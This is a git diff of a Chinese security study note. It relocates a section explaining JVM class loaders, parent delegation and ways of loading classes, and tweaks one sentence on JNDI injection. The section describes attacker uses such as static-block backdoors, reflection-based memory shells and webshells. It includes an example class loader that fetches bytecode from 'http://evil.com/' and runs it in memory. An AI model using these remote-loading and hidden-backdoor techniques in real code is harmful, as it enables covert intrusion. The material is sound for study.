@@ -15,6 +15,193 @@ published: true
 > 
 > https://mp.weixin.qq.com/s/c_4fOTBKDcByv8MZ9ayaRg
 
+## JVM 类加载器
+
+通常漏洞利用（eg：反序列化、JNDI 注入）等都需要 JVM 把构造好的恶意代码加载进入才能执行。（eg：反序列化，将数据流转变回对象时，JVM 需要根据数据里面的信息去加载对应的类，若构造了恶意的特殊数据，诱导 JVM 加载危险的类则就诱发漏洞利用；JNDI 注入就是诱导 Java 去远程加载一个恶意的类；）
+
+Java 被认为相对安全，是因为其将不同来源的代码隔离开，这种隔离依靠不同的类加载器来实现。
+
+### 类的生命周期
+
+![[attachments/20260203.png]]
+
+- 加载：将 `.class` 文件的二进制流读入 JVM 的类加载器（ClassLoader），并在内存中生成一个代表该类的 `java.lang.Class` 对象；
+	- 类加载器不仅可以从硬盘加载，还可以从网络加载；
+	- 攻击者可以写自己的 ClassLoader 来绕过安全检查，加载恶意的字节码；
+- 验证：检查 `.class` 文件是否符合规范，有没有危害虚拟机的指令；
+- 准备：为类的静态变量（`static`）分配内存，并设默认值（比如 0 或 null）；
+- 解析：把代码里的符号引用（比如“调用那个打印函数”）换成直接引用（内存里的具体地址）；
+- 初始化：执行类中的静态代码块（`static { ... }`）和静态变量的赋值；
+	- 可将恶意代码藏在 `static` 代码块里，类一旦加载，代码会自动执行；
+- 使用：JVM 开始执行的 `main` 方法或者其他方法。这时候字节码被解释执行，或者被 JIT 编译器编译成机器码执行。
+	- 可动态生成类并加载，不生成文件只在内存运行（内存马）；
+	- 反射调用私有化方法；
+- 卸载：当一个类不再被使用，且加载它的 ClassLoader 也被回收时，JVM 的垃圾回收器（GC）会把这个类从内存中清除；
+	- 持久化（eg：将内存马绑定到不会被回收的核心类加载器上）
+
+```mermaid
+graph LR
+    A[.java 源码] -->|javac 编译 | B(.class 字节码)
+    B -->|加载 Loading| C[内存中的 Class 对象]
+    C -->|验证 Verification| D{安全吗？}
+    D -->|否 | E[抛出异常]
+    D -->|是 | F[准备 & 解析]
+    F -->|初始化 Initialization| G[执行 static 代码块]
+    G -->|使用 Execution| H[程序运行/业务逻辑]
+    H -->|卸载 Unloading| I[GC 回收内存]
+    
+    style D fill:#f9f,stroke:#333,stroke-width:2px
+    style G fill:#ff9999,stroke:#333,stroke-width:2px
+```
+
+### 类加载器的分类
+
+![[attachments/20260316.png]]
+
+- Bootstrap ClassLoader（启动类加载器）：C++实现，JVM 内部，负责 Java 核心类库 (`rt.jar`、`java.lang.*`)，路径在 `$JAVA_HOME/jre/lib`；（核心保护类，几乎无法直接攻击，但可尝试污染核心类路径）
+- Extension ClassLoader（扩展类加载器）：Java 实现，复则扩展类库（ext 目录），路径在 `$JAVA_HOME/jre/lib/ext`；（隔离扩展代码，一些官方认证外包，如果 ext 目录权限配置不当，可能被植入恶意 jar）
+- Application ClassLoader（应用程序类加载器）：Java 实现，负责 classpath 下的用户代码，路径在 `-classpath` 指定的目录；（加载业务代码，最常见的攻击入口（反序列化、文件上传等））
+- Custom ClassLoader（自定义类加载器）：自己写的 Java 代码，负责网络加载、加密加载、隔离加载等，场景：热更新、插件系统、安全沙箱；（攻击者可自定义加载器绕过检查，或用于隐蔽加载恶意代码）
+
+### 双亲委派模型
+
+```java
+// 伪代码：双亲委派的核心逻辑
+protected Class<?> loadClass(String name, boolean resolve) {
+    // 1. 先看看这个类是不是已经加载过了
+    Class<?> c = findLoadedClass(name);
+    
+    if (c == null) {
+        try {
+            // 2. 有父加载器？先让父加载器尝试加载（委派）
+            if (parent != null) {
+                c = parent.loadClass(name, false);
+            } else {
+                // 3. 没有父加载器（Bootstrap），用原生方法加载
+                c = findBootstrapClassOrNull(name);
+            }
+        } catch (ClassNotFoundException e) {
+            // 4. 父加载器都加载不了，才自己尝试加载
+            if (c == null) {
+                c = findClass(name);  // 自定义加载器主要重写这个方法
+            }
+        }
+    }
+    
+    if (resolve) {
+        resolveClass(c);  // 链接阶段
+    }
+    return c;
+}
+```
+
+作用：
+
+- 防止核心类被篡改：攻击者写了一个 `java.lang.String` 恶意类，想替换原版。但因为双亲委派，请求会先交给 Bootstrap 加载器，它会加载真正的核心类，攻击者的类永远没机会被加载。
+- 避免类的重复加载：同一个类在 JVM 里只有一份，防止不同模块加载不同版本的类导致冲突（也防止攻击者用“同名不同内容”的类）。
+- 建立信任链：上层加载器加载的类，天然被下层信任。这为 Java 的沙箱安全模型打下基础。
+
+部分场景需要子加载器优先：
+
+- SPI 机制（JDBC、JNDI）：核心类需要加载用户实现的类
+- 热部署/插件系统：不同插件需要隔离，不能互相干扰
+- 攻击场景：攻击者自定义 ClassLoader，绕过双亲委派，加载恶意字节码
+
+```java
+// 打破双亲委派的示例（重写 loadClass）
+public class EvilClassLoader extends ClassLoader {
+    @Override
+    protected Class<?> loadClass(String name, boolean resolve) {
+        // 不先问父加载器，自己直接加载
+        return findClass(name);
+    }
+    
+    @Override
+    protected Class<?> findClass(String name) {
+        // 从网络/加密数据/内存中读取字节码
+        byte[] bytes = loadByteFromSomewhere(name);
+        return defineClass(name, bytes, 0, bytes.length);
+    }
+}
+```
+
+### 类加载的几种方式
+
+- 隐式加载：new 一个对象、调用静态方法、访问静态字段时；JVM 自动触发，用户无感知
+
+```java
+// 执行到这行时，User 类会被自动加载
+User user = new User();
+```
+
+可利用"自动加载"特性，在静态代码块中埋后门
+
+- 显式加载：代码主动调用 Class.forName() 或 ClassLoader.loadClass()
+
+```java
+// 方式 1：加载 + 初始化（会执行 static 代码块）
+Class<?> c1 = Class.forName("com.evil.Malicious");
+
+// 方式 2：只加载，不初始化（更安全）
+Class<?> c2 = ClassLoader.getSystemClassLoader().loadClass("com.evil.Malicious");
+```
+
+反序列化漏洞、JNDI 注入常利用 Class.forName 触发恶意类初始化
+
+- 反射加载：通过反射 API 动态调用类或方法
+
+```java
+Class<?> clazz = Class.forName("com.evil.Backdoor");
+Object instance = clazz.newInstance();  // 创建实例
+Method method = clazz.getMethod("doEvil");
+method.invoke(instance);  // 执行恶意方法
+```
+
+制作内存马、Webshell 常用反射绕过代码审计，因为调用关系在源码里看不出来
+
+- 自定义 ClassLoader 加载：自己写一个 ClassLoader，从网络、数据库、加密文件中加载字节码；核心方法：重写 `findClass()` + 调用 `defineClass()`
+
+```java
+public class NetworkClassLoader extends ClassLoader {
+    protected Class<?> findClass(String name) {
+        // 从远程服务器下载字节码
+        byte[] bytes = downloadFromHttp("http://evil.com/" + name + ".class");
+        // 把字节码"定义"为一个类（关键！）
+        return defineClass(name, bytes, 0, bytes.length);
+    }
+}
+```
+
+可用于实现安全沙箱、插件隔离；攻击者用它在内存中动态加载恶意类，不留文件痕迹（高级内存马）
+
+- 方法句柄/InvokeDynamic：Java 7+ 的 MethodHandle 或 invokedynamic 指令
+，更灵活的调用方式，常用于动态语言支持
+
+高级攻击技术可能用它绕过传统检测
+
+```mermaid
+graph TD
+    subgraph 类加载器层次
+        B[Bootstrap ClassLoader] -->|委派 | E[Extension ClassLoader]
+        E -->|委派 | A[Application ClassLoader]
+        A -->|可扩展 | C[Custom ClassLoader]
+    end
+    
+    subgraph 加载方式
+        W1[隐式: new / 静态调用] --> A
+        W2[显式: Class.forName] --> A
+        W3[反射: Method.invoke] --> A
+        W4[自定义: defineClass] --> C
+    end
+    
+    subgraph 安全关注点
+        S1[核心类保护] -.-> B
+        S2[静态代码块执行] -.-> W2
+        S3[内存马隐藏] -.-> W4
+        S4[双亲委派绕过] -.-> C
+    end
+```
+
 ## Web 服务-Servlet
 
 Servlet 生命周期
@@ -483,197 +670,6 @@ JAVA 内置 writeObject()/readObject() 内置原生写法：
 
 搞清楚入口类，需要修改的值，需要传递的值
 
----
-
-## JVM 类加载器
-
-通常漏洞利用（eg：反序列化、JNDI 注入）等都需要 JVM 把构造好的恶意代码加载进入才能执行。（eg：反序列化，将数据流转变回对象时，JVM 需要根据数据里面的信息去加载对应的类，若构造了恶意的特殊数据，诱导 JVM 加载危险的类则就诱发漏洞利用；JNDI 注入就是诱导 Java 去远程加载一个恶意的类；）
-
-Java 被认为相对安全，是因为其将不同来源的代码隔离开，这种隔离依靠不同的类加载器来实现。
-
-### 类的生命周期
-
-![[attachments/20260203.png]]
-
-- 加载：将 `.class` 文件的二进制流读入 JVM 的类加载器（ClassLoader），并在内存中生成一个代表该类的 `java.lang.Class` 对象；
-	- 类加载器不仅可以从硬盘加载，还可以从网络加载；
-	- 攻击者可以写自己的 ClassLoader 来绕过安全检查，加载恶意的字节码；
-- 验证：检查 `.class` 文件是否符合规范，有没有危害虚拟机的指令；
-- 准备：为类的静态变量（`static`）分配内存，并设默认值（比如 0 或 null）；
-- 解析：把代码里的符号引用（比如“调用那个打印函数”）换成直接引用（内存里的具体地址）；
-- 初始化：执行类中的静态代码块（`static { ... }`）和静态变量的赋值；
-	- 可将恶意代码藏在 `static` 代码块里，类一旦加载，代码会自动执行；
-- 使用：JVM 开始执行的 `main` 方法或者其他方法。这时候字节码被解释执行，或者被 JIT 编译器编译成机器码执行。
-	- 可动态生成类并加载，不生成文件只在内存运行（内存马）；
-	- 反射调用私有化方法；
-- 卸载：当一个类不再被使用，且加载它的 ClassLoader 也被回收时，JVM 的垃圾回收器（GC）会把这个类从内存中清除；
-	- 持久化（eg：将内存马绑定到不会被回收的核心类加载器上）
-
-```mermaid
-graph LR
-    A[.java 源码] -->|javac 编译 | B(.class 字节码)
-    B -->|加载 Loading| C[内存中的 Class 对象]
-    C -->|验证 Verification| D{安全吗？}
-    D -->|否 | E[抛出异常]
-    D -->|是 | F[准备 & 解析]
-    F -->|初始化 Initialization| G[执行 static 代码块]
-    G -->|使用 Execution| H[程序运行/业务逻辑]
-    H -->|卸载 Unloading| I[GC 回收内存]
-    
-    style D fill:#f9f,stroke:#333,stroke-width:2px
-    style G fill:#ff9999,stroke:#333,stroke-width:2px
-```
-
-### 类加载器的分类
-
-![[attachments/20260316.png]]
-
-- Bootstrap ClassLoader（启动类加载器）：C++实现，JVM 内部，负责 Java 核心类库 (`rt.jar`、`java.lang.*`)，路径在 `$JAVA_HOME/jre/lib`；（核心保护类，几乎无法直接攻击，但可尝试污染核心类路径）
-- Extension ClassLoader（扩展类加载器）：Java 实现，复则扩展类库（ext 目录），路径在 `$JAVA_HOME/jre/lib/ext`；（隔离扩展代码，一些官方认证外包，如果 ext 目录权限配置不当，可能被植入恶意 jar）
-- Application ClassLoader（应用程序类加载器）：Java 实现，负责 classpath 下的用户代码，路径在 `-classpath` 指定的目录；（加载业务代码，最常见的攻击入口（反序列化、文件上传等））
-- Custom ClassLoader（自定义类加载器）：自己写的 Java 代码，负责网络加载、加密加载、隔离加载等，场景：热更新、插件系统、安全沙箱；（攻击者可自定义加载器绕过检查，或用于隐蔽加载恶意代码）
-
-### 双亲委派模型
-
-```java
-// 伪代码：双亲委派的核心逻辑
-protected Class<?> loadClass(String name, boolean resolve) {
-    // 1. 先看看这个类是不是已经加载过了
-    Class<?> c = findLoadedClass(name);
-    
-    if (c == null) {
-        try {
-            // 2. 有父加载器？先让父加载器尝试加载（委派）
-            if (parent != null) {
-                c = parent.loadClass(name, false);
-            } else {
-                // 3. 没有父加载器（Bootstrap），用原生方法加载
-                c = findBootstrapClassOrNull(name);
-            }
-        } catch (ClassNotFoundException e) {
-            // 4. 父加载器都加载不了，才自己尝试加载
-            if (c == null) {
-                c = findClass(name);  // 自定义加载器主要重写这个方法
-            }
-        }
-    }
-    
-    if (resolve) {
-        resolveClass(c);  // 链接阶段
-    }
-    return c;
-}
-```
-
-作用：
-
-- 防止核心类被篡改：攻击者写了一个 `java.lang.String` 恶意类，想替换原版。但因为双亲委派，请求会先交给 Bootstrap 加载器，它会加载真正的核心类，攻击者的类永远没机会被加载。
-- 避免类的重复加载：同一个类在 JVM 里只有一份，防止不同模块加载不同版本的类导致冲突（也防止攻击者用“同名不同内容”的类）。
-- 建立信任链：上层加载器加载的类，天然被下层信任。这为 Java 的沙箱安全模型打下基础。
-
-部分场景需要子加载器优先：
-
-- SPI 机制（JDBC、JNDI）：核心类需要加载用户实现的类
-- 热部署/插件系统：不同插件需要隔离，不能互相干扰
-- 攻击场景：攻击者自定义 ClassLoader，绕过双亲委派，加载恶意字节码
-
-```java
-// 打破双亲委派的示例（重写 loadClass）
-public class EvilClassLoader extends ClassLoader {
-    @Override
-    protected Class<?> loadClass(String name, boolean resolve) {
-        // 不先问父加载器，自己直接加载
-        return findClass(name);
-    }
-    
-    @Override
-    protected Class<?> findClass(String name) {
-        // 从网络/加密数据/内存中读取字节码
-        byte[] bytes = loadByteFromSomewhere(name);
-        return defineClass(name, bytes, 0, bytes.length);
-    }
-}
-```
-
-### 类加载的几种方式
-
-- 隐式加载：new 一个对象、调用静态方法、访问静态字段时；JVM 自动触发，用户无感知
-
-```java
-// 执行到这行时，User 类会被自动加载
-User user = new User();
-```
-
-可利用"自动加载"特性，在静态代码块中埋后门
-
-- 显式加载：代码主动调用 Class.forName() 或 ClassLoader.loadClass()
-
-```java
-// 方式 1：加载 + 初始化（会执行 static 代码块）
-Class<?> c1 = Class.forName("com.evil.Malicious");
-
-// 方式 2：只加载，不初始化（更安全）
-Class<?> c2 = ClassLoader.getSystemClassLoader().loadClass("com.evil.Malicious");
-```
-
-反序列化漏洞、JNDI 注入常利用 Class.forName 触发恶意类初始化
-
-- 反射加载：通过反射 API 动态调用类或方法
-
-```java
-Class<?> clazz = Class.forName("com.evil.Backdoor");
-Object instance = clazz.newInstance();  // 创建实例
-Method method = clazz.getMethod("doEvil");
-method.invoke(instance);  // 执行恶意方法
-```
-
-制作内存马、Webshell 常用反射绕过代码审计，因为调用关系在源码里看不出来
-
-- 自定义 ClassLoader 加载：自己写一个 ClassLoader，从网络、数据库、加密文件中加载字节码；核心方法：重写 `findClass()` + 调用 `defineClass()`
-
-```java
-public class NetworkClassLoader extends ClassLoader {
-    protected Class<?> findClass(String name) {
-        // 从远程服务器下载字节码
-        byte[] bytes = downloadFromHttp("http://evil.com/" + name + ".class");
-        // 把字节码"定义"为一个类（关键！）
-        return defineClass(name, bytes, 0, bytes.length);
-    }
-}
-```
-
-可用于实现安全沙箱、插件隔离；攻击者用它在内存中动态加载恶意类，不留文件痕迹（高级内存马）
-
-- 方法句柄/InvokeDynamic：Java 7+ 的 MethodHandle 或 invokedynamic 指令
-，更灵活的调用方式，常用于动态语言支持
-
-高级攻击技术可能用它绕过传统检测
-
-```mermaid
-graph TD
-    subgraph 类加载器层次
-        B[Bootstrap ClassLoader] -->|委派 | E[Extension ClassLoader]
-        E -->|委派 | A[Application ClassLoader]
-        A -->|可扩展 | C[Custom ClassLoader]
-    end
-    
-    subgraph 加载方式
-        W1[隐式: new / 静态调用] --> A
-        W2[显式: Class.forName] --> A
-        W3[反射: Method.invoke] --> A
-        W4[自定义: defineClass] --> C
-    end
-    
-    subgraph 安全关注点
-        S1[核心类保护] -.-> B
-        S2[静态代码块执行] -.-> W2
-        S3[内存马隐藏] -.-> W4
-        S4[双亲委派绕过] -.-> C
-    end
-```
-
----
-
 ## JNDI
 
 ![[attachments/20260113.png]]
@@ -693,7 +689,7 @@ DataSource ds = (DataSource) ctx.lookup("jdbc/MyDB");
 // JNDI：查找，并将他它的连接对象返回
 ```
 
-当 `lookup()` 的参数**可控**（比如来自用户输入），攻击者就可以传入恶意地址
+当开发者在定义 JNDI 接口初始化时， `lookup()` 的参数**可控**（比如来自用户输入），攻击者就可以传入恶意地址
 
 ```java
 // 用户输入直接拼接到 lookup
